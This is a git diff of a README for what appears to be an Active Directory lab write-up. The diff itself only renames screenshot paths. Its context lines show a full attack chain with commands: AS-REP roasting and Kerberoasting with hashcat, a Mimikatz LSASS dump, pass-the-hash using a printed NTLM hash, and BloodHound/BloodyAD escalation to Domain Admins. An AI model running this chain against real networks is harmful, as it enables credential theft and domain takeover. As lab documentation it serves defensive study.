@@ -74,7 +74,7 @@ Port scan DC01 to confirm it's a Domain Controller:
 nmap -Pn -p- 10.10.10.10
 ```
 
-![Nmap scan of DC01](screenshots/01-nmap-scan-dc01.png)
+![Nmap scan of DC01](01-nmap-scan-dc01.png)
 *Typical AD DC ports exposed: 53/88/135/139/445/464/593/636/3268/3269/5985.*
 
 Confirm the domain name and SID via an anonymous null session:
@@ -84,7 +84,7 @@ rpcclient -U "" -N 10.10.10.10
 rpcclient $> lsaquery
 ```
 
-![rpcclient null session](screenshots/02-rpcclient-null-session.png)
+![rpcclient null session](02-rpcclient-null-session.png)
 *`Domain Name: ADLAB`, full Domain SID leaked with zero authentication.*
 
 **Attack vector:** anonymous enumeration / null session allowed on the domain, leaking the Domain SID without authentication — later used to compute RIDs for every account (**T1087.002**).
@@ -97,7 +97,7 @@ Kerberos pre-authentication reveals, via distinct AS-REQ error codes, whether a 
 ~/go/bin/kerbrute userenum -d adlab.local --dc 10.10.10.10 -t 10 targeted.txt
 ```
 
-![Kerbrute userenum](screenshots/03-kerbrute-userenum.png)
+![Kerbrute userenum](03-kerbrute-userenum.png)
 *5/11 valid usernames confirmed: `svc_sql`, `chi`, `duc`, `duong`, `svc_legacy`.*
 
 **Attack vector:** Kerberos pre-auth response differences allow full username enumeration (**T1589.001** / **T1087**).
@@ -112,7 +112,7 @@ Tried `svc_sql` first — not vulnerable (pre-auth is required):
 impacket-GetNPUsers adlab.local/svc_sql -dc-ip 10.10.10.10 -no-pass -format hashcat
 ```
 
-![GetNPUsers svc_sql fails](screenshots/04-asrep-svc_sql-fail.png)
+![GetNPUsers svc_sql fails](04-asrep-svc_sql-fail.png)
 
 Tried `svc_legacy` — pre-auth disabled, AS-REP hash obtained:
 
@@ -120,7 +120,7 @@ Tried `svc_legacy` — pre-auth disabled, AS-REP hash obtained:
 impacket-GetNPUsers adlab.local/svc_legacy -dc-ip 10.10.10.10 -no-pass -format hashcat -outputfile asrep.hash
 ```
 
-![AS-REP hash for svc_legacy](screenshots/05-asrep-svc_legacy-hash.png)
+![AS-REP hash for svc_legacy](05-asrep-svc_legacy-hash.png)
 
 Offline crack with Hashcat (mode 18200) against `rockyou.txt`:
 
@@ -128,7 +128,7 @@ Offline crack with Hashcat (mode 18200) against `rockyou.txt`:
 hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
 ```
 
-![Hashcat cracks AS-REP hash](screenshots/06-hashcat-crack-asrep.png)
+![Hashcat cracks AS-REP hash](06-hashcat-crack-asrep.png)
 *Cracked: `princesita`.*
 
 Verify the credential online before moving on (always confirm manually before exploiting further):
@@ -137,7 +137,7 @@ Verify the credential online before moving on (always confirm manually before ex
 nxc smb 10.10.10.10 -u svc_legacy -p 'princesita'
 ```
 
-![NetExec verifies svc_legacy creds](screenshots/07-nxc-verify-svc_legacy.png)
+![NetExec verifies svc_legacy creds](07-nxc-verify-svc_legacy.png)
 
 **Attack vector:** `svc_legacy` has Kerberos pre-auth disabled and uses a weak, dictionary-crackable password — yielding the first domain credential with zero prior access. This is the initial foothold for the entire chain.
 
@@ -154,14 +154,14 @@ ldapsearch -x -H ldap://10.10.10.10 -D "svc_sql@adlab.local" -w '1qaz2wsx' \
   -b "DC=adlab,DC=local" "(objectClass=computer)" dNSHostName
 ```
 
-![LDAP computer enumeration](screenshots/08-ldapsearch-computers.png)
+![LDAP computer enumeration](08-ldapsearch-computers.png)
 
 ```bash
 nslookup WS01.adlab.local 10.10.10.10
 nslookup WS02.adlab.local 10.10.10.10
 ```
 
-![nslookup WS01/WS02](screenshots/09-nslookup-ws01-ws02.png)
+![nslookup WS01/WS02](09-nslookup-ws01-ws02.png)
 *WS01 = `10.10.10.11`, WS02 = `10.10.10.12`.*
 
 Re-try `princesita` against other regular user accounts — found password reuse on `duc`:
@@ -170,7 +170,7 @@ Re-try `princesita` against other regular user accounts — found password reuse
 nxc smb 10.10.10.11 -u duc -p 'princesita'
 ```
 
-![duc:princesita Pwn3d on WS01](screenshots/10-nxc-duc-pwn3d-ws01.png)
+![duc:princesita Pwn3d on WS01](10-nxc-duc-pwn3d-ws01.png)
 *`duc` is a local admin on WS01, flagged `(Pwn3d!)`.*
 
 Log on to WS01 as `duc` and dump LSASS with Mimikatz:
@@ -179,11 +179,11 @@ Log on to WS01 as `duc` and dump LSASS with Mimikatz:
 .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
 ```
 
-![Mimikatz logonpasswords listing](screenshots/11-mimikatz-logonpasswords-dwm.png)
+![Mimikatz logonpasswords listing](11-mimikatz-logonpasswords-dwm.png)
 
 Among the listed sessions, a separate **interactive** logon belonging to the domain **Administrator** account was found, with its full NTLM hash exposed:
 
-![Administrator NTLM hash in LSASS](screenshots/12-mimikatz-administrator-hash.png)
+![Administrator NTLM hash in LSASS](12-mimikatz-administrator-hash.png)
 *`Domain: ADLAB`, SID ending in `-500`, `NTLM: 579da618cfbfa85247acf1f800a280a4`.*
 
 Use that hash to Pass-the-Hash onto WS02 — no plaintext password needed:
@@ -192,13 +192,13 @@ Use that hash to Pass-the-Hash onto WS02 — no plaintext password needed:
 nxc winrm 10.10.10.12 -u Administrator -H '579da618cfbfa85247acf1f800a280a4'
 ```
 
-![PTH success on WS02](screenshots/13-nxc-winrm-pth-ws02.png)
+![PTH success on WS02](13-nxc-winrm-pth-ws02.png)
 
 ```bash
 evil-winrm -i 10.10.10.12 -u Administrator -H 579da618cfbfa85247acf1f800a280a4
 ```
 
-![Evil-WinRM shell, whoami /priv](screenshots/14-evilwinrm-whoami-priv.png)
+![Evil-WinRM shell, whoami /priv](14-evilwinrm-whoami-priv.png)
 *Full admin shell on WS02 — every privilege `Enabled`.*
 
 **Attack vector:** password reuse (T1078) establishes a foothold on WS01 as `duc`; credential dumping from LSASS (T1003.001) leaks the domain Administrator's NTLM hash left behind by a prior interactive session; Pass-the-Hash (T1550.002) then achieves lateral movement onto WS02 with full admin rights, with no plaintext password ever required.
@@ -213,10 +213,10 @@ Using the `svc_legacy` credential obtained earlier, request TGS tickets for all 
 impacket-GetUserSPNs adlab.local/svc_legacy:'princesita' -dc-ip 10.10.10.10 -request -outputfile kerberoast.hash
 ```
 
-![GetUserSPNs finds svc_sql's SPN](screenshots/15-getuserspns-svc_sql-spn.png)
+![GetUserSPNs finds svc_sql's SPN](15-getuserspns-svc_sql-spn.png)
 *SPN `MSSQLSvc/dc01.adlab.local:1433` belongs to `svc_sql`.*
 
-![Kerberoast TGS hash](screenshots/16-kerberoast-hash.png)
+![Kerberoast TGS hash](16-kerberoast-hash.png)
 
 Offline crack (Hashcat mode 13100):
 
@@ -230,7 +230,7 @@ Cracked: `1qaz2wsx`. Verify:
 nxc smb 10.10.10.10 -u svc_sql -p '1qaz2wsx'
 ```
 
-![Verify svc_sql creds](screenshots/17-nxc-verify-svc_sql.png)
+![Verify svc_sql creds](17-nxc-verify-svc_sql.png)
 
 **Attack vector:** `svc_sql` is SPN-registered with a weak password, and Kerberos encryption is still RC4 (easier to crack than AES) — yielding a fresh domain credential used as the stepping stone for the final privilege escalation.
 
@@ -246,12 +246,12 @@ Collect AD data with the freshly obtained `svc_sql` credential:
 bloodhound-python -u svc_sql -p '1qaz2wsx' -d adlab.local -ns 10.10.10.10 -c All
 ```
 
-![BloodHound.py collection](screenshots/18-bloodhound-python-collection.png)
+![BloodHound.py collection](18-bloodhound-python-collection.png)
 *3 computers, 9 users, 54 groups, 2 GPOs, 2 OUs, 19 containers collected.*
 
 Import into BloodHound CE and analyze the escalation path from `svc_sql`:
 
-![BloodHound graph: ITSupport GenericAll over Domain Admins](screenshots/19-bloodhound-graph-itsupport-genericall.png)
+![BloodHound graph: ITSupport GenericAll over Domain Admins](19-bloodhound-graph-itsupport-genericall.png)
 *`SVC_SQL --MemberOf--> ITSUPPORT --GenericAll--> DOMAIN ADMINS`. `svc_sql` has no direct rights on Domain Admins, but inherits them through the ITSupport group.*
 
 Exploit with BloodyAD — add `svc_sql` to `Domain Admins` using the inherited `GenericAll`:
@@ -260,7 +260,7 @@ Exploit with BloodyAD — add `svc_sql` to `Domain Admins` using the inherited `
 bloodyAD --host 10.10.10.10 -d adlab.local -u svc_sql -p '1qaz2wsx' add groupMember "Domain Admins" svc_sql
 ```
 
-![BloodyAD adds svc_sql to Domain Admins](screenshots/20-bloodyad-add-domainadmins.png)
+![BloodyAD adds svc_sql to Domain Admins](20-bloodyad-add-domainadmins.png)
 
 Confirm full Domain Admin rights directly on DC01:
 
@@ -268,7 +268,7 @@ Confirm full Domain Admin rights directly on DC01:
 nxc winrm 10.10.10.10 -u svc_sql -p '1qaz2wsx'
 ```
 
-![svc_sql Pwn3d on DC01](screenshots/21-nxc-winrm-svc_sql-pwn3d-dc01.png)
+![svc_sql Pwn3d on DC01](21-nxc-winrm-svc_sql-pwn3d-dc01.png)
 *Full Domain Admin compromise achieved.*
 
 **Attack vector:** ACL Abuse / Privilege Escalation via Group Membership (**T1098**, overlapping **T1484 — Group Policy/Domain Object Modification** depending on classification) — an intermediate group (`ITSupport`) was misconfigured with `GenericAll` over `Domain Admins`. This is a textbook example of an AD attack path that isn't a straight line of direct privileges, but runs through intermediate groups — exactly the kind of relationship BloodHound surfaces far faster than manual review.
@@ -293,5 +293,5 @@ These findings map directly to the Hardening measures implemented by the rest of
 .
 ├── README.md                  # this write-up
 ├── AD_Attack_Chain.drawio     # editable attack-path diagram (open at app.diagrams.net)
-└── screenshots/               # all terminal/GUI evidence referenced above
+└──                # all terminal/GUI evidence referenced above
 ```
